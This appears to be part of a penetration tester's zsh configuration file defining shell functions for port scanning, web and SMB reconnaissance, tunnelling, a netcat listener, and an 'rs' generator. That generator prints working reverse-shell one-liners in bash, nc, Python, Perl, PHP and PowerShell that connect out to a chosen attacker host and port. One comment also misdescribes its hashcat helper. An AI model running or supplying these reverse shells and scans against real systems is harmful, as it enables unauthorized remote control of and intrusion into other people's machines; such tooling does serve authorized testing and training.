# ---------------------------------------------------------------------------
#  Functions
# ---------------------------------------------------------------------------
# quick port/service sweep:  scan <target> [ports]
scan() { nmap -Pn -n -sV -sC --open -T4 "${2:--p- --top-ports 1000}" "$1"; }

# fast all-TCP sweep then service detect on the hits
sweep() { nmap -Pn -n -p- --open --min-rate 3000 -T4 "$1" -oG "/tmp/sweep-$1.gnmap"; }

# web surface:  webscan <url>
webscan() { echo "$1" | httpx -silent -title -tech-detect -status-code -web-server; }

# reverse shell one-liner generator:  rs <lhost> <lport> [bash|nc|python|powershell|perl|php]
rs() {
  local lh=${1:?usage: rs <lhost> <lport> [type]} lp=${2:?usage: rs <lhost> <lport> [type]} t=${3:-bash}
  case $t in
    bash)   echo "bash -i >& /dev/tcp/$lh/$lp 0>&1" ;;
    nc)     echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f" ;;
    python) echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$lh\",$lp));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'" ;;
    perl)   echo "perl -e 'use Socket;\$i=\"$lh\";\$p=$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" ;;
    php)    echo "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
    powershell|ps) echo "\$c=New-Object System.Net.Sockets.TCPClient('$lh',$lp);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$o2=\$o+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$o2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()" ;;
    *) echo "unknown type: $t (bash|nc|python|perl|php|powershell)" ;;
  esac
}

# catch a shell:  listen [port]
listen() { rlwrap -cAr nc -lvnp "${1:-4444}"; }

# SMB/AD recon one-shot:  adrecon <target>
adrecon() { netexec smb "$1" -u '' -p '' --shares 2>/dev/null | grep -Ei 'signing|shares|READ|WRITE' ; }

mkcd() { mkdir -p "$1" && cd "$1" || return 1; }

# tcp relay/tunnel cheat:  tunnel <lhost> <lport> <rhost> <rport>
tunnel() { socat "TCP-LISTEN:$2,fork,reuseaddr" "TCP:$3:$4" ; }

# grab a hash file for cracking from a directory
hashcat-mode() { hashcat --example-hashes | grep -iB3 -A1 "$1" | head -40; }

# p10k live tweak
p10k() { emulate -L zsh; case "$1" in
  ascii)   export P10K_ASCII=1;  sed -i 's/^P10K_ASCII=.*/P10K_ASCII=1/' ~/.zshrc; exec zsh ;;
  nerd)    export P10K_ASCII=0;  sed -i 's/^P10K_ASCII=.*/P10K_ASCII=0/' ~/.zshrc; exec zsh ;;
  config)  exec zsh -c 'source ~/.p10k.zsh; p10k configure' ;;
  *)       echo "usage: p10k ascii|nerd|config" ;; esac }

# tool inventory
redteam-check() { bash /opt/redteam-check.sh; }

